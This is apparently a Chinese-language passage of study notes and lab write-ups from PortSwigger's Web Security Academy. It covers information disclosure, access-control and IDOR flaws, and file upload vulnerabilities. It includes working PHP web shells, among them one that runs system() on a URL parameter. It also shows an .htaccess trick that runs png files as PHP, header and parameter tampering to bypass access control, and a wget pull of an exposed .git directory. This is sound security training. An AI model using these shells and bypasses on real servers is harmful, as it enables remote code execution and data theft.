<li>用于加密通过客户端传输的数据的密钥</li>
</ul>
<p>调试信息有时可能会记录在单独的文件中。如果攻击者能够访问此文件，则它可以作为了解应用程序运行时状态的有用参考。它还可以提供一些线索，说明他们如何提供精心设计的输入来操纵应用程序状态和控制接收到的信息。</p>
<p><strong>实验室</strong></p>
<p><strong>APPRENTICE</strong><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page">调试页面信息泄露</a></p>
<p>未解决</p>
<h3 id="用户帐户页面"><a href="#用户帐户页面" class="headerlink" title="用户帐户页面"></a>用户帐户页面</h3><p>就其本质而言，用户的个人资料或帐户页面通常包含敏感信息，例如用户的电子邮件地址、电话号码、API 密钥等。由于用户通常只能访问自己的帐户页面，这本身并不代表漏洞。但是，一些网站包含<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/logic-flaws">逻辑缺陷</a>，可能允许攻击者利用这些页面来查看其他用户的数据。</p>
<p>例如，考虑一个网站，该网站根据<code>user</code>参数确定要加载哪个用户的帐户页面。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /user/personal-info?user=carlos</span><br></pre></td></tr></table></figure>

<p>大多数网站都会采取措施防止攻击者通过简单地更改此参数来访问任意用户的帐户页面。然而，有时加载单个数据项的逻辑并不那么健壮。</p>
<p>攻击者可能无法完全加载另一个用户的帐户页面，但是获取和呈现用户注册电子邮件地址的逻辑可能不会检查参数是否与当前登录的用户匹配。在这种情况下<code>user</code>，简单地更改<code>user</code>参数将允许攻击者在他们自己的帐户页面上显示任意用户的电子邮件地址。</p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/access-control/idor">当我们介绍访问控制和IDOR</a>漏洞 时，我们将更详细地研究这些类型的漏洞。</p>
<h4 id="阅读更多"><a href="#阅读更多" class="headerlink" title="阅读更多"></a>阅读更多</h4><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/access-control">访问控制</a></p>
<h3 id="通过备份文件泄露源代码-1"><a href="#通过备份文件泄露源代码-1" class="headerlink" title="通过备份文件泄露源代码"></a>通过备份文件泄露源代码</h3><p>获得源代码访问权限使攻击者更容易了解应用程序的行为并构建高严重性攻击。敏感数据有时甚至硬编码在源代码中。这方面的典型示例包括用于访问后端组件的 API 密钥和凭据。</p>
<p>如果您可以确定正在使用特定的开源技术，则可以轻松访问有限数量的源代码。</p>
<p>有时，甚至有可能导致网站暴露自己的源代码。在绘制网站地图时，您可能会发现明确引用了一些源代码文件。不幸的是，请求它们通常不会泄露代码本身。当服务器处理具有特定扩展名（例如 ）的文件时<code>.php</code>，它通常会执行代码，而不是简单地将其作为文本发送给客户端。但是，在某些情况下，您可以欺骗网站返回文件的内容。例如，文本编辑器经常在编辑原始文件时生成临时备份文件。这些临时文件通常以某种方式表示，例如通过附加波浪号 (<code>~</code>) 添加到文件名或添加不同的文件扩展名。使用备份文件扩展名请求代码文件有时可以让您在响应中读取文件的内容。</p>
<p><strong>实验室</strong></p>
<p><strong>APPRENTICE</strong><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files">通过备份文件泄露源代码</a></p>
<p>未解决</p>
<p>一旦攻击者获得了源代码的访问权限，这可能是朝着能够识别和利用其他几乎不可能的其他漏洞迈出的一大步。一个这样的例子是不安全的<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/deserialization">反序列化</a>。稍后我们将在专门的主题中查看此漏洞。</p>
<h4 id="阅读更多-1"><a href="#阅读更多-1" class="headerlink" title="阅读更多"></a>阅读更多</h4><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/deserialization">不安全的反序列化</a></p>
<h3 id="不安全配置导致信息泄露-1"><a href="#不安全配置导致信息泄露-1" class="headerlink" title="不安全配置导致信息泄露"></a>不安全配置导致信息泄露</h3><p>由于配置不当，网站有时容易受到攻击。由于第三方技术的广泛使用，这种情况尤其常见，实施这些技术的人员不一定能很好地理解其大量的配置选项。</p>
<p>在其他情况下，开发人员可能会忘记在生产环境中禁用各种调试选项。例如，HTTP<code>TRACE</code>方法是为诊断目的而设计的。<code>TRACE</code>如果启用，Web 服务器将通过在响应中回显收到的确切请求来响应使用该方法的请求。这种行为通常是无害的，但偶尔会导致信息泄露，例如反向代理可能附加到请求中的内部身份验证标头的名称。</p>
<p><strong>实验室</strong></p>
<p><strong>APPRENTICE</strong><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass">通过信息泄露绕过身份验证</a></p>
<p>未解决</p>
<h3 id="版本控制历史-1"><a href="#版本控制历史-1" class="headerlink" title="版本控制历史"></a>版本控制历史</h3><p>事实上，所有网站都是使用某种形式的版本控制系统开发的，例如 Git。默认情况下，Git 项目将其所有版本控制数据存储在名为<code>.git</code>. 有时，网站会在生产环境中公开此目录。在这种情况下，您可以通过简单地浏览到 来访问它<code>/.git</code>。</p>
<p>虽然手动浏览原始文件结构和内容通常是不切实际的，但有多种方法可以下载整个<code>.git</code>目录。然后，您可以使用本地安装的 Git 打开它，以访问该网站的版本控制历史记录。这可能包括包含已提交更改和其他有趣信息的日志。</p>
<p>这可能不会让您访问完整的源代码，但比较差异将允许您阅读一小段代码。与任何源代码一样，您可能还会发现一些更改行中的敏感数据被硬编码。</p>
<hr>
<p>访问 <code>/.git</code> </p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225181418196.png" alt="image-20230225181418196"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -r https://0aac00450382116fc1c39a1200c900c0.web-security-academy.net/.git   //下载文件夹</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://git-cola.github.io/downloads.html   //git-cola工具</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225183415747.png" alt="image-20230225183415747"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230225183817791.png" alt="image-20230225183817791"></p>
<h1 id="Access-control-vulnerabilities-and-privilege-escalation"><a href="#Access-control-vulnerabilities-and-privilege-escalation" class="headerlink" title="Access control vulnerabilities and privilege escalation"></a>Access control vulnerabilities and privilege escalation</h1><h1 id="（访问控制漏洞和权限提升）"><a href="#（访问控制漏洞和权限提升）" class="headerlink" title="（访问控制漏洞和权限提升）"></a>（访问控制漏洞和权限提升）</h1><p>在 Web 应用程序的上下文中，访问控制依赖于身份验证和会话管理：</p>
<ul>
<li><strong>身份验证</strong>识别用户并确认他们是他们所说的人。</li>
<li><strong>会话管理</strong>标识同一用户发出的后续 HTTP 请求。</li>
<li><strong>访问控制</strong>确定是否允许用户执行他们试图执行的操作。</li>
</ul>
<p>从用户的角度来看，访问控制可以分为以下几类：</p>
<ul>
<li>垂直访问控制</li>
<li>横向访问控制</li>
<li>上下文相关的访问控制</li>
</ul>
<h2 id="垂直提权"><a href="#垂直提权" class="headerlink" title="垂直提权"></a>垂直提权</h2><p>：普通用户有权限访问不允许他们访问的功能</p>
<h4 id="LAB：未受保护的管理功能"><a href="#LAB：未受保护的管理功能" class="headerlink" title="LAB：未受保护的管理功能"></a>LAB：未受保护的管理功能</h4><p>访问<code>robots.txt</code></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228130841048.png" alt="image-20230228130841048"></p>
<p>访问<code>/administrator-panel</code></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228130936146.png" alt="image-20230228130936146"></p>
<h4 id="LAB：具有不可预测的-URL-的未受保护的管理功能"><a href="#LAB：具有不可预测的-URL-的未受保护的管理功能" class="headerlink" title="LAB：具有不可预测的 URL 的未受保护的管理功能"></a>LAB：具有不可预测的 URL 的未受保护的管理功能</h4><p>应用程序可能仍会将 URL 泄露给用户。例如，URL 可能会在基于用户角色构建用户界面的 JavaScript 中公开：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> isAdmin = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (isAdmin) &#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="keyword">var</span> adminPanelTag = <span class="built_in">document</span>.createElement(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">	adminPanelTag.setAttribute(<span class="string">&#x27;https://insecure-website.com/administrator-panel-yb556&#x27;</span>);</span><br><span class="line">	adminPanelTag.innerText = <span class="string">&#x27;Admin panel&#x27;</span>;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>如果用户是管理员用户，此脚本会添加指向用户 UI 的链接。但是，包含 URL 的脚本对所有用户可见，无论其角色如何。</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228131840772.png" alt="image-20230228131840772"></p>
<p>于是我们访问<code>/admin-psukzu</code></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228131908066.png" alt="image-20230228131908066"></p>
<h3 id="基于参数的访问控制方法"><a href="#基于参数的访问控制方法" class="headerlink" title="基于参数的访问控制方法"></a>基于参数的访问控制方法</h3><p>一些应用程序在登录时确定用户的访问权限或角色，然后将此信息存储在用户可控的位置，例如隐藏字段、cookie 或预设查询字符串参数。应用程序根据提交的值做出后续的访问控制决策</p>
<h4 id="LAB-用户角色由请求参数控制"><a href="#LAB-用户角色由请求参数控制" class="headerlink" title="LAB:  用户角色由请求参数控制"></a>LAB:  用户角色由请求参数控制</h4><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228134541359.png" alt="image-20230228134541359"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228134546053.png" alt="image-20230228134546053"></p>
<h4 id="LAB-用户角色可以在用户配置文件中修改"><a href="#LAB-用户角色可以在用户配置文件中修改" class="headerlink" title="LAB:用户角色可以在用户配置文件中修改"></a>LAB:用户角色可以在用户配置文件中修改</h4><p>可以看到修改邮箱的时候响应中<code>&quot;roleid&quot;:1</code></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228144020770.png" alt="image-20230228144020770"></p>
<p>我们将参数<code>&quot;roleid&quot;:2</code>传到JSON中</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228143836869.png" alt="image-20230228143836869"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228150904522.png" alt="image-20230228150904522"></p>
<h3 id="平台配置错误导致访问控制失效"><a href="#平台配置错误导致访问控制失效" class="headerlink" title="平台配置错误导致访问控制失效"></a>平台配置错误导致访问控制失效</h3><p>某些应用程序通过根据用户角色限制对特定 URL 和 HTTP 方法的访问，在平台层实施访问控制。例如，应用程序可能会配置如下规则：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">DENY</span><span class="punctuation">: </span>POST, /admin/deleteUser, managers</span><br></pre></td></tr></table></figure>

<p>对于 managers 组中的用户， 此规则拒绝访问<code>POST</code>URL 上的方法。<code>/admin/deleteUser</code>在这种情况下，各种事情都可能出错，从而导致绕过访问控制。</p>
<p>一些应用程序框架支持各种非标准的 HTTP 标头，可用于覆盖原始请求中的 URL，例如<code>X-Original-URL</code>和<code>X-Rewrite-URL</code>。如果网站使用严格的前端控制来限制基于 URL 的访问，但应用程序允许通过请求标头覆盖 URL，则可以使用如下请求绕过访问控制：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1 </span><br><span class="line"><span class="attribute">X-Original-URL</span><span class="punctuation">: </span>/admin/deleteUser ...</span><br><span class="line">ps:通过这种方式我们也可以访问到url/admin/deleteuser页面  而不是直接url访问</span><br></pre></td></tr></table></figure>

<h4 id="LAB-可以规避基于-URL-的访问控制"><a href="#LAB-可以规避基于-URL-的访问控制" class="headerlink" title="LAB: 可以规避基于 URL 的访问控制"></a>LAB: 可以规避基于 URL 的访问控制</h4><p>虽然环境直接给出了admin panel，但我们发现访问被拒绝了</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228161030404.png" alt="image-20230228161030404"></p>
<p>尝试加载/admin并观察您是否被阻止。响应非常简单，表明它可能来自前端系统</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Original-URL</span><span class="punctuation">: </span>/admin</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228162339420.png" alt="image-20230228162339420">可以看到已经给出了删除carlos的url  我们继续构造</p>
<p>构造的时候需要把传参放在请求头上，否则会无法识别参数<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228162504098.png" alt="image-20230228162504098"></p>
<h4 id="LAB-可以绕过基于方法的访问控制"><a href="#LAB-可以绕过基于方法的访问控制" class="headerlink" title="LAB: 可以绕过基于方法的访问控制"></a>LAB: 可以绕过基于方法的访问控制</h4><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228165346022.png" alt="image-20230228165346022"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228165434583.png" alt="image-20230228165434583"></p>
<p>然后我们将请求方式改为get<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228165508928.png" alt="image-20230228165508928"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228165712806.png" alt="image-20230228165712806"></p>
<h2 id="横向越权"><a href="#横向越权" class="headerlink" title="横向越权"></a>横向越权</h2><p>当一个用户能够访问属于另一个用户的资源，而不是他们自己的那种类型的资源时，就会出现水平权限提升</p>
<h4 id="LAB-请求参数控制用户ID"><a href="#LAB-请求参数控制用户ID" class="headerlink" title="LAB: 请求参数控制用户ID"></a>LAB: 请求参数控制用户ID</h4><p>更改id之后没有验证，可以直接获得api key</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228185304874.png" alt="image-20230228185304874"></p>
<h4 id="LAB-用户ID受请求参数控制，不可预测"><a href="#LAB-用户ID受请求参数控制，不可预测" class="headerlink" title="LAB: 用户ID受请求参数控制，不可预测"></a>LAB: 用户ID受请求参数控制，不可预测</h4><p>应用程序可以使用全局唯一标识符 (GUID) 来标识用户，而不是递增的数字。在这里，攻击者可能无法猜测或预测另一个用户的标识符。但是，属于其他用户的 GUID 可能会在引用用户的应用程序的其他地方公开，例如用户消息或评论。</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228190113247.png" alt="image-20230228190113247"></p>
<p>找到用户ID 用上述方法继续替换  <code>6ae9514d-f57d-4ad1-8cef-f9ff50d39eba</code></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228190452771.png" alt="image-20230228190452771"></p>
<h4 id="LAB-用户-ID-受请求参数控制，在重定向中发生数据泄漏"><a href="#LAB-用户-ID-受请求参数控制，在重定向中发生数据泄漏" class="headerlink" title="LAB: 用户 ID 受请求参数控制，在重定向中发生数据泄漏"></a>LAB: 用户 ID 受请求参数控制，在重定向中发生数据泄漏</h4><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228191517367.png" alt="image-20230228191517367"></p>
<p>替换ID 可以发现<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228192256799.png" alt="image-20230228192256799"></p>
<p>我们可以看到虽然重定向了  但还是返回了属于carlos的报文</p>
<h2 id="水平到垂直的特权升级"><a href="#水平到垂直的特权升级" class="headerlink" title="水平到垂直的特权升级"></a>水平到垂直的特权升级</h2><h4 id="LAB-由请求参数控制的用户-ID，密码泄露"><a href="#LAB-由请求参数控制的用户-ID，密码泄露" class="headerlink" title="LAB: 由请求参数控制的用户 ID，密码泄露"></a>LAB: 由请求参数控制的用户 ID，密码泄露</h4><p>如果目标用户是应用程序管理员，那么攻击者将获得对管理帐户页面的访问权限。此页面可能会泄露管理员密码或提供更改密码的方法，或者可能提供对特权功能的直接访问。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://0a7e00480467501ac46e73b100480010.web-security-academy.net/my-account?id=carlos</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228193657386.png" alt="image-20230228193657386"></p>
<p>用户换成administrator</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228194332411.png" alt="image-20230228194332411"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228194715989.png" alt="image-20230228194715989"></p>
<h3 id="不安全的直接对象引用-IDOR"><a href="#不安全的直接对象引用-IDOR" class="headerlink" title="不安全的直接对象引用(IDOR)"></a>不安全的直接对象引用(IDOR)</h3><p>不安全的直接对象引用 (IDOR,Insecure direct object references) 是访问控制漏洞的一个子类别。当应用程序使用用户提供的输入直接访问对象并且攻击者可以修改输入以获得未经授权的访问时，就会出现 IDOR。</p>
<h4 id="LAB-不安全的直接对象引用"><a href="#LAB-不安全的直接对象引用" class="headerlink" title="LAB: 不安全的直接对象引用"></a>LAB: 不安全的直接对象引用</h4><p>将用户聊天记录直接存储在服务器的文件系统中，并使用静态 URL 检索它们</p>
<p>发现是从2.txt 开始  我们改为1.txt尝试  找到密码</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228195921675.png" alt="image-20230228195921675"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228195936067.png" alt="image-20230228195936067"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228200035556.png" alt="image-20230228200035556"></p>
<h3 id="多步骤流程中的访问控制漏洞"><a href="#多步骤流程中的访问控制漏洞" class="headerlink" title="多步骤流程中的访问控制漏洞"></a>多步骤流程中的访问控制漏洞</h3><h4 id="LAB-多步流程，一步无访问控制"><a href="#LAB-多步流程，一步无访问控制" class="headerlink" title="LAB: 多步流程，一步无访问控制"></a>LAB: 多步流程，一步无访问控制</h4><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228214740589.png" alt="image-20230228214740589"></p>
<p>登录wiener用户  获取用户session<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228214757769.png" alt="image-20230228214757769"></p>
<p>替换到之前抓到的包中的session</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228214826908.png" alt="image-20230228214826908"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228215318253.png" alt="image-20230228215318253"></p>
<h3 id="基于-Referer-的访问控制"><a href="#基于-Referer-的访问控制" class="headerlink" title="基于 Referer 的访问控制"></a>基于 Referer 的访问控制</h3><p><code>Referer</code>一些网站基于 HTTP 请求中提交的标头 进行访问控制。标<code>Referer</code>头一般由浏览器添加到请求中，以指示发起请求的页面。</p>
<h4 id="LAB-基于-Referer-的访问控制"><a href="#LAB-基于-Referer-的访问控制" class="headerlink" title="LAB: 基于 Referer 的访问控制"></a>LAB: 基于 Referer 的访问控制</h4><p>替换session就可以  但可以看到这个实验重点在于利用referer进行访问控制</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228220425313.png" alt="image-20230228220425313"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228220408557.png" alt="image-20230228220408557"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230228220515937.png" alt="image-20230228220515937"></p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>文件上传漏洞是指当 Web 服务器允许用户将文件上传到其文件系统而没有充分验证其名称、类型、内容或大小等内容时。未能正确执行这些限制可能意味着甚至可以使用基本的图像上传功能来上传任意和潜在危险的文件。这甚至可以包括启用远程代码执行的服务器端脚本文件。</p>
<p>在某些情况下，上传文件的行为本身就足以造成损害。其他攻击可能涉及对文件的后续 HTTP 请求，通常是为了触发服务器执行该文件。</p>
<p><strong>影响漏洞的因素：</strong></p>
<ul>
<li>网站未能正确验证文件的哪个方面，无论是大小、类型、内容等  -&gt;  <strong>文件是否能上传</strong></li>
<li>文件上传成功后有哪些限制   -&gt; <strong>文件上传后能否顺利执行扩大影响</strong></li>
</ul>
<p>如果文件名未正确验证，这可能允许攻击者通过上传同名文件来覆盖关键文件。如果服务器也容易受到<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/file-path-traversal">目录遍历的</a>攻击，这可能意味着攻击者甚至能够将文件上传到意想不到的位置。</p>
<h2 id="Web服务器如何处理对静态文件的请求？"><a href="#Web服务器如何处理对静态文件的请求？" class="headerlink" title="Web服务器如何处理对静态文件的请求？"></a>Web服务器如何处理对静态文件的请求？</h2><p>服务器解析请求中的路径以识别文件扩展名。然后它使用它来确定所请求文件的类型，通常是通过将其与扩展名和 MIME 类型（Multipurpose Internet Mail Extensions，媒体类型）之间的预配置映射列表进行比较。接下来发生的事情取决于文件类型和服务器的配置。</p>
<ul>
<li>如果此文件类型是不可执行的，例如图像或静态 HTML 页面，则服务器可能只是在 HTTP 响应中将文件的内容发送给客户端。</li>
<li>如果文件类型是可执行的，比如PHP文件，<strong>并且</strong>服务器被配置为执行这种类型的文件，它会在运行脚本之前根据HTTP请求中的头部和参数分配变量。生成的输出然后可以在 HTTP 响应中发送到客户端。</li>
<li>如果文件类型是可执行的，但服务器<strong>没有</strong>配置为执行这种类型的文件，它通常会响应一个错误。但是，在某些情况下，文件的内容可能仍以纯文本形式提供给客户端。此类错误配置偶尔会被利用来泄露源代码和其他敏感信息。</li>
</ul>
<h2 id="利用不受限制的文件上传来部署-webshell"><a href="#利用不受限制的文件上传来部署-webshell" class="headerlink" title="利用不受限制的文件上传来部署 webshell"></a>利用不受限制的文件上传来部署 webshell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/path/to/target/file&#x27;</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//任意文件读取</span></span><br></pre></td></tr></table></figure>

<p>一个更通用的 web shell 可能看起来像这样：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> system(<span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="LAB-通过-web-shell-上传远程代码执行"><a href="#LAB-通过-web-shell-上传远程代码执行" class="headerlink" title="LAB: 通过 web shell 上传远程代码执行"></a>LAB: 通过 web shell 上传远程代码执行</h4><p>没有过滤的文件上传</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230301190656349.png" alt="image-20230301190656349"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230301190717867.png"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230301190735266.png"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230301190917560.png" alt="image-20230301190917560"></p>
<h2 id="利用有缺陷的文件上传验证"><a href="#利用有缺陷的文件上传验证" class="headerlink" title="利用有缺陷的文件上传验证"></a>利用有缺陷的文件上传验证</h2><h3 id="有缺陷的文件类型验证"><a href="#有缺陷的文件类型验证" class="headerlink" title="有缺陷的文件类型验证"></a>有缺陷的文件类型验证</h3><h4 id="LAB-Webshell-通过内容类型限制绕过上传"><a href="#LAB-Webshell-通过内容类型限制绕过上传" class="headerlink" title="LAB: Webshell 通过内容类型限制绕过上传"></a>LAB: Webshell 通过内容类型限制绕过上传</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/home/carlos/secret&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230301195446046.png" alt="image-20230301195446046"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230301195435001.png" alt="image-20230301195435001"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230301195658434.png" alt="image-20230301195658434"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230301195717478.png" alt="image-20230301195717478"></p>
<h3 id="防止在用户可访问的目录中执行文件"><a href="#防止在用户可访问的目录中执行文件" class="headerlink" title="防止在用户可访问的目录中执行文件"></a>防止在用户可访问的目录中执行文件</h3><p>服务端可能会在某一目录下限制我们执行文件，那么就提供给了我们一种可能性：将webshell文件传到其他目录下执行</p>
<blockquote>
<p>Web 服务器经常使用请求<code>filename</code>中的字段<code>multipart/form-data</code>来确定文件的名称和保存位置。</p>
</blockquote>
<h4 id="LAB-通过路径遍历上传-Web-shell"><a href="#LAB-通过路径遍历上传-Web-shell" class="headerlink" title="LAB: 通过路径遍历上传 Web shell"></a>LAB: 通过路径遍历上传 Web shell</h4><p>上传之后发现他不会执行php文件  而是将其作为文本输出</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230301220013642.png" alt="image-20230301220013642"></p>
<p>换一个目录进行上传</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230301222537916.png" alt="image-20230301222537916"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230301222733906.png" alt="image-20230301222733906"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230301222752353.png" alt="image-20230301222752353"></p>
<h2 id="危险文件类型的黑名单不足"><a href="#危险文件类型的黑名单不足" class="headerlink" title="危险文件类型的黑名单不足"></a>危险文件类型的黑名单不足</h2><h3 id="覆盖服务器配置"><a href="#覆盖服务器配置" class="headerlink" title="覆盖服务器配置"></a>覆盖服务器配置</h3><p>有时可以通过使用可能仍然可执行的鲜为人知的替代文件扩展名（例如<code>.php5</code>、<code>.shtml</code>等）来绕过此类黑名单。</p>
<h4 id="LAB-Web-shell-通过扩展黑名单绕过上传"><a href="#LAB-Web-shell-通过扩展黑名单绕过上传" class="headerlink" title="LAB:Web shell 通过扩展黑名单绕过上传"></a>LAB:Web shell 通过扩展黑名单绕过上传</h4><p>发现服务器端已经限制我们不能上传php文件</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230302150949944.png" alt="image-20230302150949944"></p>
<p>尝试用不同的拓展名</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230302151115122.png" alt="image-20230302151115122"></p>
<p>发现无法执行</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230302151204240.png" alt="image-20230302151204240"></p>
<p>修改目录  发现图片无法被当作php解析</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230302151913327.png" alt="image-20230302151913327"></p>
<p>这里下面思路就是通过上传.htaccess文件修改配置  然后传png图片包含读文件语句 解析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php png  //将png结尾的文件当作php来解析</span><br><span class="line"></span><br><span class="line">Content-Type: text/plain</span><br></pre></td></tr></table></figure>

<p>然后将php代码写好</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/home/carlos/secret&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>然后将文件后缀名直接改成png 上传</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230302154544535.png" alt="image-20230302154544535"></p>
